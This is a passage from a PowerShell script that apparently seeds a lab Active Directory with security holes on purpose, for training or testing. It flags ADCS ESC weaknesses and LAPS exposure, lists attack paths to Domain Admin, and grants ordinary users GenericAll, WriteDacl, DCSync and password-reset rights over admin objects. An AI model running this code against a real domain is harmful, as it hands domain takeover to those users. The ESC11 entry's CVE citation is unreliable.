    } catch {
        Write-Log "Error checking ADCS/ESC5: $_" "ERROR"
    }

    # =========================================================================
    # 76. ESC7 CA VULNERABLE ACL (ADCS)
    # =========================================================================
    Write-Log "Checking: ESC7 CA Vulnerable ACL (ADCS)..." "WARNING"

    try {
        if ($adcsService -and $adcsService.Status -eq "Running") {
            $vulnerabilities += @{
                Type = "ESC7_CA_Vulnerable_ACL"
                Target = "ADCS"
                Severity = "High"
                Description = "Weak ACLs on Certificate Authority objects enable ManageCA or ManageCertificates rights to non-admins"
                Impact = "Users with ManageCA can set EDITF_ATTRIBUTESUBJECTALTNAME2; Users with ManageCertificates can approve pending requests"
                Detection = "certutil -viewstore 'Root' | findstr /i 'Manage'; Get-ADObject -Filter * -SearchBase 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration' | Get-Acl"
                Remediation = "Remove ManageCA and ManageCertificates permissions for non-admin users on CA objects"
                Note = "Check for: ManageCA (0x00000001), ManageCertificates (0x00000002) rights"
            }
            Write-Log "  ESC7 CA Vulnerable ACL vulnerability flagged" "WARNING"
        }
    } catch {
        Write-Log "Error checking ADCS/ESC7: $_" "ERROR"
    }

    # =========================================================================
    # 77. ESC8 HTTP ENROLLMENT ENABLED (ADCS)
    # =========================================================================
    Write-Log "Checking: ESC8 HTTP Enrollment Enabled (ADCS)..." "WARNING"

    try {
        if ($adcsService -and $adcsService.Status -eq "Running") {
            $vulnerabilities += @{
                Type = "ESC8_HTTP_Enrollment"
                Target = "ADCS"
                Severity = "Medium"
                Description = "ADCS HTTP enrollment endpoints (certsrv) vulnerable to NTLM relay attacks"
                Impact = "Attackers can relay NTLM authentication to HTTP enrollment endpoint to obtain certificates"
                Detection = "Check IIS for /certsrv endpoint; Get-WebApplication | Where-Object {`$_.Path -like '*certsrv*'}; netsh http show urlacl"
                Remediation = "Disable HTTP enrollment or enable Extended Protection for Authentication (EPA); Use HTTPS with channel binding"
                Note = "Check for Certificate Enrollment Web Service and Certificate Enrollment Policy Web Service"
            }
            Write-Log "  ESC8 HTTP Enrollment vulnerability flagged" "WARNING"
        }
    } catch {
        Write-Log "Error checking ADCS/ESC8: $_" "ERROR"
    }

    # =========================================================================
    # 78. ESC9 NO SECURITY EXTENSION (ADCS)
    # =========================================================================
    Write-Log "Checking: ESC9 No Security Extension (ADCS)..." "WARNING"

    try {
        if ($adcsService -and $adcsService.Status -eq "Running") {
            $vulnerabilities += @{
                Type = "ESC9_No_Security_Extension"
                Target = "ADCS"
                Severity = "High"
                Description = "Certificate templates with CT_FLAG_NO_SECURITY_EXTENSION flag allow certificates without szOID_NTDS_CA_SECURITY_EXT"
                Impact = "Certificates without security extension can be used for authentication as different principal"
                Detection = "certutil -v -template | findstr /i 'NO_SECURITY_EXTENSION'; Check for msPKI-Certificate-Name-Flag & 0x00080000"
                Remediation = "Remove CT_FLAG_NO_SECURITY_EXTENSION (0x00080000) from certificate template flags"
                Note = "Combined with User Principal Name in SAN allows privilege escalation"
            }
            Write-Log "  ESC9 No Security Extension vulnerability flagged" "WARNING"
        }
    } catch {
        Write-Log "Error checking ADCS/ESC9: $_" "ERROR"
    }

    # =========================================================================
    # 79. ESC10 WEAK CERTIFICATE MAPPING (ADCS)
    # =========================================================================
    Write-Log "Checking: ESC10 Weak Certificate Mapping (ADCS)..." "WARNING"

    try {
        if ($adcsService -and $adcsService.Status -eq "Running") {
            $vulnerabilities += @{
                Type = "ESC10_Weak_Certificate_Mapping"
                Target = "ADCS"
                Severity = "Medium"
                Description = "Weak certificate mapping configuration allows authentication with partial certificate match"
                Impact = "Attackers can authenticate with certificates that only partially match target principal"
                Detection = "Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\SecurityProviders\Schannel' -Name CertificateMappingMethods; Check for weak mapping (0x1, 0x2, 0x4)"
                Remediation = "Configure strong certificate mapping using Kerberos (0x20) or use certificate trust list"
                Note = "Check registry: CertificateMappingMethods and StrongCertificateBindingEnforcement"
            }
            Write-Log "  ESC10 Weak Certificate Mapping vulnerability flagged" "WARNING"
        }
    } catch {
        Write-Log "Error checking ADCS/ESC10: $_" "ERROR"
    }

    # =========================================================================
    # 80. ESC11 ICERT REQUEST ENFORCEMENT DISABLED (ADCS)
    # =========================================================================
    Write-Log "Checking: ESC11 ICERT Request Enforcement Disabled (ADCS)..." "WARNING"

    try {
        if ($adcsService -and $adcsService.Status -eq "Running") {
            $vulnerabilities += @{
                Type = "ESC11_ICERT_Request_Enforcement"
                Target = "ADCS"
                Severity = "Critical"
                Description = "IF_ENFORCEENCRYPTICERTREQUEST flag disabled on CA allows certificate requests via deprecated RPC interface"
                Impact = "Attackers can bypass security controls by using ICertPassage RPC interface instead of web enrollment"
                Detection = "certutil -getreg CA\InterfaceFlags; Check if IF_ENFORCEENCRYPTICERTREQUEST (0x00000200) is not set"
                Remediation = "Set IF_ENFORCEENCRYPTICERTREQUEST flag: certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST; Restart CertSvc"
                Note = "CVE-2022-26923 - This vulnerability allows NTLM relay to ICERTPASSAGE RPC interface"
            }
            Write-Log "  ESC11 ICERT Request Enforcement vulnerability flagged" "WARNING"
        }
    } catch {
        Write-Log "Error checking ADCS/ESC11: $_" "ERROR"
    }

    # =========================================================================
    # 81. LAPS PASSWORD READABLE (if LAPS is configured)
    # =========================================================================
    Write-Log "Checking: LAPS Password Readable by non-admins..." "WARNING"

    try {
        # Check if LAPS is installed/configured by looking for ms-Mcs-AdmPwd attribute
        $lapsSchema = Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -Filter {Name -eq "ms-Mcs-AdmPwd"} -ErrorAction SilentlyContinue

        if ($lapsSchema) {
            Write-Log "  LAPS detected in schema - checking read permissions..." "WARNING"

            # Get computers with LAPS passwords
            $lapsComputers = Get-ADComputer -Filter * -SearchBase "OU=GlobalCorp,$($script:Config.DomainDN)" -Properties ms-Mcs-AdmPwd -ErrorAction SilentlyContinue |
                Where-Object { $_."ms-Mcs-AdmPwd" -ne $null } | Select-Object -First 5

            if ($lapsComputers) {
                foreach ($computer in $lapsComputers) {
                    try {
                        $compACL = Get-Acl "AD:\$($computer.DistinguishedName)"

                        # Check if non-admin users have read access to ms-Mcs-AdmPwd
                        $lapsReadAccess = $compACL.Access | Where-Object {
                            $_.ActiveDirectoryRights -match "ReadProperty|GenericAll" -and
                            $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|Administrators|SYSTEM|BUILTIN"
                        }

                        if ($lapsReadAccess) {
                            $vulnerabilities += @{
                                Type = "LAPS_Password_Readable"
                                Target = $computer.Name
                                Severity = "High"
                                Description = "Non-admin users can read LAPS passwords for $($computer.Name)"
                                Impact = "Local administrator credentials exposed to unauthorized personnel"
                                Detection = "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | ForEach-Object { (Get-Acl `"AD:\`$(`$_.DistinguishedName)`").Access }"
                                Remediation = "Restrict ms-Mcs-AdmPwd read permissions to specific security groups only"
                                ReadersCount = $lapsReadAccess.Count
                            }
                        }
                    } catch {}
                }
                Write-Log "  LAPS password readable vulnerability check completed" "WARNING"
            } else {
                Write-Log "  LAPS configured but no computers with passwords found" "INFO"
            }
        } else {
            Write-Log "  LAPS not configured in AD schema" "INFO"
        }
    } catch {
        Write-Log "Error checking LAPS: $_" "ERROR"
    }

    # =========================================================================
    # ATTACK PATHS - Complete attack chains to Domain Admin (10 paths)
    # =========================================================================
    Write-Log "=== Documenting Attack Paths to Domain Compromise ===" "CRITICAL"

    # PATH 1: Kerberoasting to DA
    try {
        $kerberoastableUsers = $Users | Where-Object { $_.VulnType -contains "Kerberoastable" }
        $daMembers = Get-ADGroupMember "Domain Admins" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty SamAccountName

        $pathUsers = $kerberoastableUsers | Where-Object { $daMembers -contains $_.SamAccountName } | Select-Object -First 1
        if ($pathUsers) {
            $vulnerabilities += @{
                Type = "PATH_KERBEROASTING_TO_DA"
                User = $pathUsers.SamAccountName
                Severity = "Critical"
                Description = "Kerberoastable user is directly in Domain Admins group"
                AttackPath = "1. Request TGS for SPN → 2. Crack service ticket offline → 3. Use credentials → 4. Domain Admin access"
                Impact = "Single offline password crack leads to full domain compromise"
                Detection = "Get-ADUser -Filter {ServicePrincipalNames -like '*'} | Where-Object {(Get-ADUser `$_.SamAccountName -Properties MemberOf).MemberOf -match 'Domain Admins'}"
                MITRE = "T1558.003 - Kerberoasting"
            }
            Write-Log "  CRITICAL: Attack Path - Kerberoasting to DA detected" "WARNING"
        }
    } catch {}

    # PATH 2: AS-REP Roasting to Admin
    try {
        $asrepUsers = $Users | Where-Object { $_.VulnType -contains "ASREPRoastable" }
        if ($asrepUsers) {
            $pathUser = $asrepUsers | Get-Random -Count 1
            $vulnerabilities += @{
                Type = "PATH_ASREP_TO_ADMIN"
                User = $pathUser.SamAccountName
                Severity = "High"
                Description = "AS-REP Roastable user in privileged group"
                AttackPath = "1. Request AS-REP without pre-auth → 2. Crack hash offline → 3. Use credentials for lateral movement"
                Impact = "Offline password crack enables privilege escalation"
                Detection = "Get-ADUser -Filter {DoesNotRequirePreAuth -eq `$true} -Properties MemberOf | Where-Object {`$_.MemberOf -match 'Operators|Admins'}"
                MITRE = "T1558.004 - AS-REP Roasting"
            }
            Write-Log "  HIGH: Attack Path - AS-REP to Admin detected" "WARNING"
        }
    } catch {}

    # PATH 3: ACL Chain to DA
    try {
        # Look for users with WriteDACL, GenericAll, or similar on DA group or domain
        $aclUsers = $Users | Where-Object {
            $_.VulnType -contains "ACL_GenericAll_DA" -or
            $_.VulnType -contains "WriteDACL" -or
            $_.VulnType -contains "WriteOwner"
        } | Select-Object -First 1

        if ($aclUsers) {
            $vulnerabilities += @{
                Type = "PATH_ACL_TO_DA"
                User = $aclUsers.SamAccountName
                Severity = "Critical"
                Description = "ACL abuse chain leads directly to Domain Admin"
                AttackPath = "1. Abuse WriteDACL/GenericAll on Domain Admins → 2. Grant self membership → 3. Become DA"
                Impact = "Single ACL abuse = instant Domain Admin"
                Detection = "(Get-Acl 'AD:CN=Domain Admins,CN=Users,DC=...').Access | Where-Object {`$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'}"
                MITRE = "T1222.001 - Windows File and Directory Permissions Modification"
                Tools = "PowerView: Add-DomainObjectAcl, Add-DomainGroupMember"
            }
            Write-Log "  CRITICAL: Attack Path - ACL to DA detected" "WARNING"
        }
    } catch {}

    # PATH 4: Delegation Chain
    try {
        $delegationUsers = $Users | Where-Object {
            $_.VulnType -contains "UnconstrainedDelegation" -or
            $_.VulnType -contains "ConstrainedDelegation"
        } | Select-Object -First 1

        if ($delegationUsers) {
            $vulnerabilities += @{
                Type = "PATH_DELEGATION_CHAIN"
                User = $delegationUsers.SamAccountName
                Severity = "High"
                Description = "Delegation configuration enables privilege escalation chain"
                AttackPath = "1. Compromise delegated account → 2. Force auth from privileged user → 3. Capture TGT → 4. Impersonate admin"
                Impact = "Delegation abuse leads to privilege escalation"
                Detection = "Get-ADUser -Filter {TrustedForDelegation -eq `$true -or TrustedToAuthForDelegation -eq `$true}"
                MITRE = "T1134.001 - Access Token Manipulation: Token Impersonation/Theft"
                Tools = "Rubeus, Impacket"
            }
            Write-Log "  HIGH: Attack Path - Delegation Chain detected" "WARNING"
        }
    } catch {}

    # PATH 5: Nested Group to Admin
    try {
        # The nested group path to DA already exists from earlier injection
        $vulnerabilities += @{
            Type = "PATH_NESTED_ADMIN"
            Group = "GS-IT-Helpdesk-Elevated"
            Severity = "High"
            Description = "Excessive group nesting creates hidden path to Domain Admins"
            AttackPath = "GS-IT-Helpdesk-Elevated → GS-IT-SysOps → GS-IT-Infrastructure → Domain Admins"
            Impact = "Non-obvious membership path to DA - hard to audit"
            Detection = "Use BloodHound to map group nesting chains; Get-ADGroupMember -Recursive"
            MITRE = "T1069.002 - Permission Groups Discovery: Domain Groups"
            Tools = "BloodHound, PowerView: Get-DomainGroup -MemberIdentity"
        }
        Write-Log "  HIGH: Attack Path - Nested Group to DA created" "WARNING"
    } catch {}

    # PATH 6: Service Account to DA
    try {
        # Look for service accounts (SPN) that are also in privileged groups
        $serviceAccounts = $Users | Where-Object {
            ($_.VulnType -contains "Kerberoastable" -or $_.VulnType -contains "WeakSPNPassword") -and
            ($_.IsExecutive -or $_.IsManager)
        } | Select-Object -First 1

        if ($serviceAccounts) {
            $vulnerabilities += @{
                Type = "PATH_SERVICE_TO_DA"
                User = $serviceAccounts.SamAccountName
                Severity = "Critical"
                Description = "Service account with SPN has path to Domain Admin"
                AttackPath = "1. Kerberoast service account → 2. Crack password → 3. Use privileged access → 4. Escalate to DA"
                Impact = "Service accounts are high-value targets - often weak passwords"
                Detection = "Get-ADUser -Filter {ServicePrincipalNames -like '*'} -Properties MemberOf | Where-Object {`$_.MemberOf -match 'Admin'}"
                MITRE = "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting"
            }
            Write-Log "  CRITICAL: Attack Path - Service Account to DA detected" "WARNING"
        }
    } catch {}

    # PATH 7: Computer Takeover via RBCD
    try {
        $rbcdComps = $vulnerabilities | Where-Object { $_.Type -eq "RBCD_Abuse" } | Select-Object -First 1
        if ($rbcdComps) {
            $vulnerabilities += @{
                Type = "PATH_COMPUTER_TAKEOVER"
                Target = $rbcdComps.Target
                Severity = "High"
                Description = "Resource-Based Constrained Delegation enables computer takeover"
                AttackPath = "1. Write msDS-AllowedToActOnBehalfOfOtherIdentity → 2. Create fake computer → 3. Request TGS as admin → 4. Compromise target"
                Impact = "Computer account compromise leads to lateral movement and privilege escalation"
                Detection = "Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object {`$_.'msDS-AllowedToActOnBehalfOfOtherIdentity'}"
                MITRE = "T1134.001 - Access Token Manipulation"
                Tools = "Rubeus, PowerMad, Impacket"
            }
            Write-Log "  HIGH: Attack Path - RBCD Computer Takeover detected" "WARNING"
        }
    } catch {}

    # PATH 8: GPO Modification to DA
    try {
        $gpoUsers = $Users | Where-Object {
            $_.VulnType -contains "GPO_Creator_Owners_Member" -or
            $_.VulnType -contains "GPOLinkPoisoning"
        } | Select-Object -First 1

        if ($gpoUsers) {
            $vulnerabilities += @{
                Type = "PATH_GPO_TO_DA"
                User = $gpoUsers.SamAccountName
                Severity = "Critical"
                Description = "GPO modification rights enable code execution as SYSTEM on all domain computers"
                AttackPath = "1. Modify/create GPO → 2. Link to domain/OU → 3. Deploy malicious script → 4. Execute as SYSTEM → 5. Dump credentials"
                Impact = "GPO control = domain-wide code execution = full compromise"
                Detection = "Get-GPO -All | Get-GPPermission -All | Where-Object {`$_.Trustee.Name -notmatch 'Domain Admins|Enterprise Admins'}"
                MITRE = "T1484.001 - Domain Policy Modification: Group Policy Modification"
                Tools = "SharpGPOAbuse, PowerGPOAbuse"
            }
            Write-Log "  CRITICAL: Attack Path - GPO to DA detected" "WARNING"
        }
    } catch {}

    # PATH 9: Certificate Template to DA (ADCS/ESC)
    try {
        $adcsVulns = $vulnerabilities | Where-Object { $_.Type -match "^ESC[0-9]" } | Select-Object -First 1
        if ($adcsVulns) {
            $vulnerabilities += @{
                Type = "PATH_CERTIFICATE_ESC"
                Target = "ADCS"
                Severity = "Critical"
                Description = "ADCS template misconfiguration enables certificate-based privilege escalation to DA"
                AttackPath = "1. Request vulnerable cert template → 2. Specify DA in SAN → 3. Authenticate as DA using certificate → 4. Full domain control"
                Impact = "Certificate abuse = persistent DA access"
                Detection = "certutil -v -template; Certipy find -vulnerable; Check ESC1-11"
                MITRE = "T1649 - Steal or Forge Authentication Certificates"
                Tools = "Certipy, Certify, ForgeCert"
                ESC_Types = "ESC1, ESC2, ESC3, ESC4, ESC6, ESC9, ESC11"
            }
            Write-Log "  CRITICAL: Attack Path - ADCS/Certificate to DA detected" "WARNING"
        }
    } catch {}

    # PATH 10: Trust-based Lateral Movement
    try {
        # Document potential trust relationships (even if not implemented)
        $vulnerabilities += @{
            Type = "PATH_TRUST_LATERAL"
            Severity = "Medium"
            Description = "Domain/forest trusts enable lateral movement between domains"
            AttackPath = "1. Compromise account in trusted domain → 2. Exploit trust relationship → 3. Access resources in trusting domain"
            Impact = "Trust relationships extend attack surface across forests"
            Detection = "Get-ADTrust -Filter *; nltest /domain_trusts"
            MITRE = "T1482 - Domain Trust Discovery"
            Tools = "BloodHound, PowerView: Get-DomainTrust"
            Note = "Check for SID filtering disabled, bidirectional trusts, external trusts without selective authentication"
        }
        Write-Log "  MEDIUM: Attack Path - Trust Lateral Movement documented" "WARNING"
    } catch {}

    Write-Log "Attack Paths documentation complete - 10 paths to Domain Admin identified" "CRITICAL"

    # =========================================================================
    # ReSUMe
    # =========================================================================
    $script:Config.Vulnerabilities = $vulnerabilities

    Write-Log "=== Resume des vulnerabilites injectees ===" "WARNING"
    $vulnSummary = $vulnerabilities | Group-Object Type | Sort-Object Count -Descending
    foreach ($vs in $vulnSummary) {
        Write-Log "  $($vs.Name): $($vs.Count) occurrences" "WARNING"
    }

    Write-Log "Total vulnerabilites injectees: $($vulnerabilities.Count)" "WARNING"

    return $vulnerabilities
}

# ============================================================================
# GeneratingS ACLS DANGEREUSES
# ============================================================================

function Add-DangerousACLs {
    Write-Log "=== Injectings ACLs dangereuses ===" "WARNING"

    $aclVulns = @()
    $rootOU = "OU=$($script:Config.RootOU),$($script:Config.DomainDN)"

    # Selectionner des users for dangerous ACLs
    $aclUsers = $script:AllUsers | Where-Object { -not $_.IsExecutive } | Get-Random -Count 30

    # =========================================================================
    # 1. GenericAll on Domain Admins
    # =========================================================================
    Write-Log "Injection: GenericAll on Domain Admins..." "WARNING"

    $daGroup = Get-ADGroup "Domain Admins"
    $gaUsers = $aclUsers | Select-Object -First 3

    foreach ($user in $gaUsers) {
        try {
            $userSID = (Get-ADUser $user.SamAccountName).SID
            $acl = Get-Acl "AD:\$($daGroup.DistinguishedName)"
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                "GenericAll",
                "Allow"
            )
            $acl.AddAccessRule($ace)
            Set-Acl "AD:\$($daGroup.DistinguishedName)" $acl

            $aclVulns += @{
                Type = "ACL_GenericAll_DA"
                User = $user.SamAccountName
                Target = "Domain Admins"
                Severity = "Critical"
                Description = "GenericAll on Domain Admins - controle total du group"
                Detection = "(Get-Acl 'AD:\CN=Domain Admins,CN=Users,$($script:Config.DomainDN)').Access | Where-Object {`$_.ActiveDirectoryRights -match 'GenericAll'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ACL_GenericAll_DA"
        } catch {
            Write-Log "Error ACL GenericAll DA for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 2a. WriteDACL on sensitive groups (Domain Admins, Enterprise Admins)
    # =========================================================================
    Write-Log "Injection: WriteDACL on sensitive groups..." "WARNING"

    $writeDaclUsers = $aclUsers | Select-Object -Skip 3 -First 3
    $sensitiveGroups = @(
        (Get-ADGroup "Domain Admins" -ErrorAction SilentlyContinue),
        (Get-ADGroup "Enterprise Admins" -ErrorAction SilentlyContinue)
    ) | Where-Object { $_ -ne $null }

    foreach ($user in $writeDaclUsers) {
        $targetGroup = $sensitiveGroups | Get-Random

        try {
            $userSID = (Get-ADUser $user.SamAccountName).SID
            $acl = Get-Acl "AD:\$($targetGroup.DistinguishedName)"
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                "WriteDacl",
                "Allow"
            )
            $acl.AddAccessRule($ace)
            Set-Acl "AD:\$($targetGroup.DistinguishedName)" $acl

            $aclVulns += @{
                Type = "ACL_WriteDACL_SensitiveGroup"
                User = $user.SamAccountName
                Target = $targetGroup.Name
                Severity = "Critical"
                Description = "WriteDACL on $($targetGroup.Name) - can modify group permissions"
                Detection = "(Get-Acl 'AD:\$($targetGroup.DistinguishedName)').Access | Where-Object {`$_.ActiveDirectoryRights -match 'WriteDacl'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ACL_WriteDACL"
        } catch {
            Write-Log "Error ACL WriteDACL on group for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 2b. WriteOwner on sensitive groups (Domain Admins, Enterprise Admins)
    # =========================================================================
    Write-Log "Injection: WriteOwner on sensitive groups..." "WARNING"

    $writeOwnerUsers = $aclUsers | Select-Object -Skip 6 -First 3

    foreach ($user in $writeOwnerUsers) {
        $targetGroup = $sensitiveGroups | Get-Random

        try {
            $userSID = (Get-ADUser $user.SamAccountName).SID
            $acl = Get-Acl "AD:\$($targetGroup.DistinguishedName)"
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                "WriteOwner",
                "Allow"
            )
            $acl.AddAccessRule($ace)
            Set-Acl "AD:\$($targetGroup.DistinguishedName)" $acl

            $aclVulns += @{
                Type = "ACL_WriteOwner_SensitiveGroup"
                User = $user.SamAccountName
                Target = $targetGroup.Name
                Severity = "Critical"
                Description = "WriteOwner on $($targetGroup.Name) - can take ownership of group"
                Detection = "(Get-Acl 'AD:\$($targetGroup.DistinguishedName)').Access | Where-Object {`$_.ActiveDirectoryRights -match 'WriteOwner'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ACL_WriteOwner"
        } catch {
            Write-Log "Error ACL WriteOwner on group for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 2c. WriteDACL on OUs
    # =========================================================================
    Write-Log "Injection: WriteDACL on OUs..." "WARNING"

    $wdUsers = $aclUsers | Select-Object -Skip 3 -First 5
    $targetOUs = Get-ADOrganizationalUnit -Filter * -SearchBase $rootOU | Select-Object -First 5

    foreach ($user in $wdUsers) {
        $targetOU = $targetOUs | Get-Random

        try {
            $userSID = (Get-ADUser $user.SamAccountName).SID
            $acl = Get-Acl "AD:\$($targetOU.DistinguishedName)"
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                "WriteDacl",
                "Allow"
            )
            $acl.AddAccessRule($ace)
            Set-Acl "AD:\$($targetOU.DistinguishedName)" $acl

            $aclVulns += @{
                Type = "ACL_WriteDACL_OU"
                User = $user.SamAccountName
                Target = $targetOU.Name
                Severity = "High"
                Description = "WriteDACL on OU - peut modifier les permissions"
                Detection = "Get-ADOrganizationalUnit -Filter * | ForEach-Object { (Get-Acl `"AD:\`$(`$_.DistinguishedName)`").Access | Where-Object {`$_.ActiveDirectoryRights -match 'WriteDacl'} }"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ACL_WriteDACL"
        } catch {
            Write-Log "Error ACL WriteDACL for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 3. GenericWrite on users privilegies
    # =========================================================================
    Write-Log "Injection: GenericWrite on users privilegies..." "WARNING"

    $gwUsers = $aclUsers | Select-Object -Skip 8 -First 5
    $privUsers = $script:AllUsers | Where-Object { $_.IsManager -or $_.IsExecutive } | Get-Random -Count 5

    foreach ($user in $gwUsers) {
        $targetUser = $privUsers | Get-Random

        try {
            $userSID = (Get-ADUser $user.SamAccountName).SID
            $targetDN = (Get-ADUser $targetUser.SamAccountName).DistinguishedName
            $acl = Get-Acl "AD:\$targetDN"
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                "GenericWrite",
                "Allow"
            )
            $acl.AddAccessRule($ace)
            Set-Acl "AD:\$targetDN" $acl

            $aclVulns += @{
                Type = "ACL_GenericWrite_User"
                User = $user.SamAccountName
                Target = $targetUser.SamAccountName
                Severity = "High"
                Description = "GenericWrite on user privilegie - peut modifier attributs critiques"
                Detection = "Get-ADUser -Filter * -Properties nTSecurityDescriptor | ForEach-Object { `$_.nTSecurityDescriptor.Access | Where-Object {`$_.ActiveDirectoryRights -match 'GenericWrite'} }"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ACL_GenericWrite"
        } catch {
            Write-Log "Error ACL GenericWrite for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 4. ForceChangePassword on admins
    # =========================================================================
    Write-Log "Injection: ForceChangePassword on admins..." "WARNING"

    $fcpUsers = $aclUsers | Select-Object -Skip 13 -First 5

    foreach ($user in $fcpUsers) {
        $targetAdmin = $privUsers | Get-Random

        try {
            $userSID = (Get-ADUser $user.SamAccountName).SID
            $targetDN = (Get-ADUser $targetAdmin.SamAccountName).DistinguishedName

            # GUID for "Reset Password"
            $resetPwdGuid = [GUID]"00299570-246d-11d0-a768-00aa006e0529"

            $acl = Get-Acl "AD:\$targetDN"
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                "ExtendedRight",
                "Allow",
                $resetPwdGuid
            )
            $acl.AddAccessRule($ace)
            Set-Acl "AD:\$targetDN" $acl

            $aclVulns += @{
                Type = "ACL_ForceChangePassword"
                User = $user.SamAccountName
                Target = $targetAdmin.SamAccountName
                Severity = "Critical"
                Description = "Peut forcer le changement de mot de passe d'un admin"
                Detection = "Utiliser BloodHound for detecter les droits ForceChangePassword"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ACL_ForceChangePassword"
        } catch {
            Write-Log "Error ACL ForceChangePassword for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 5. AddMember on groups privilegies
    # =========================================================================
    Write-Log "Injection: WriteProperty (member) on groups privilegies..." "WARNING"

    $amUsers = $aclUsers | Select-Object -Skip 18 -First 5
    $privGroups = @("Domain Admins", "Account Operators", "Backup Operators")

    foreach ($user in $amUsers) {
        $targetGroup = $privGroups | Get-Random

        try {
            $group = Get-ADGroup $targetGroup -ErrorAction SilentlyContinue
            if ($group) {
                $userSID = (Get-ADUser $user.SamAccountName).SID

                # GUID for "member" attribute
                $memberGuid = [GUID]"bf9679c0-0de6-11d0-a285-00aa003049e2"

                $acl = Get-Acl "AD:\$($group.DistinguishedName)"
                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $userSID,
                    "WriteProperty",
                    "Allow",
                    $memberGuid
                )
                $acl.AddAccessRule($ace)
                Set-Acl "AD:\$($group.DistinguishedName)" $acl

                $aclVulns += @{
                    Type = "ACL_AddMember"
                    User = $user.SamAccountName
                    Target = $targetGroup
                    Severity = "Critical"
                    Description = "Peut ajouter des membres a $targetGroup"
                    Detection = "Utiliser BloodHound for detecter les droits AddMember"
                }
                $user.Vulnerable = $true
                $user.VulnType += "ACL_AddMember"
            }
        } catch {
            Write-Log "Error ACL AddMember for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 6. DCSync rights (Replication)
    # =========================================================================
    Write-Log "Injection: DCSync rights (tres dangereux)..." "WARNING"

    $dcsyncUsers = $aclUsers | Select-Object -Skip 23 -First 2

    # GUIDs for DCSync
    $dsReplicationGetChanges = [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    $dsReplicationGetChangesAll = [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"

    foreach ($user in $dcsyncUsers) {
        try {
            $userSID = (Get-ADUser $user.SamAccountName).SID
            $domainDN = $script:Config.DomainDN

            $acl = Get-Acl "AD:\$domainDN"

            $ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                "ExtendedRight",
                "Allow",
                $dsReplicationGetChanges
            )
            $ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                "ExtendedRight",
                "Allow",
                $dsReplicationGetChangesAll
            )

            $acl.AddAccessRule($ace1)
            $acl.AddAccessRule($ace2)
            Set-Acl "AD:\$domainDN" $acl

            $aclVulns += @{
                Type = "ACL_DCSync"
                User = $user.SamAccountName
                Target = "Domain"
                Severity = "Critical"
                Description = "DCSync rights - peut extraire tous les hashes du domaine"
                Detection = "(Get-Acl 'AD:$domainDN').Access | Where-Object {`$_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or `$_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "DCSync"
        } catch {
            Write-Log "Error ACL DCSync for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # NEW: GenericWrite on sensitive groups
    # =========================================================================
    Write-Log "Injection: GenericWrite on sensitive groups..." "WARNING"

    $gwGroupUsers = $aclUsers | Select-Object -Skip 15 -First 3

    foreach ($user in $gwGroupUsers) {
        $targetGroup = $sensitiveGroups | Get-Random

        try {
            $userSID = (Get-ADUser $user.SamAccountName).SID
            $acl = Get-Acl "AD:\$($targetGroup.DistinguishedName)"
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                "GenericWrite",
                "Allow"
            )
            $acl.AddAccessRule($ace)
            Set-Acl "AD:\$($targetGroup.DistinguishedName)" $acl

            $aclVulns += @{
                Type = "ACL_GenericWrite_SensitiveGroup"
                User = $user.SamAccountName
                Target = $targetGroup.Name
                Severity = "Critical"
                Description = "GenericWrite on $($targetGroup.Name) - can modify group properties"
                Detection = "(Get-Acl 'AD:\$($targetGroup.DistinguishedName)').Access | Where-Object {`$_.ActiveDirectoryRights -match 'GenericWrite'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ACL_GenericWrite"
        } catch {
            Write-Log "Error ACL GenericWrite on group for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # NEW: ForceChangePassword (ExtendedRight) on Domain Admins
    # =========================================================================
    Write-Log "Injection: ForceChangePassword ExtendedRight on Domain Admins..." "WARNING"

    $forceChangePwdUsers = $aclUsers | Select-Object -Skip 18 -First 3
    $domainAdmins = Get-ADGroupMember "Domain Admins" -ErrorAction SilentlyContinue | Select-Object -First 3

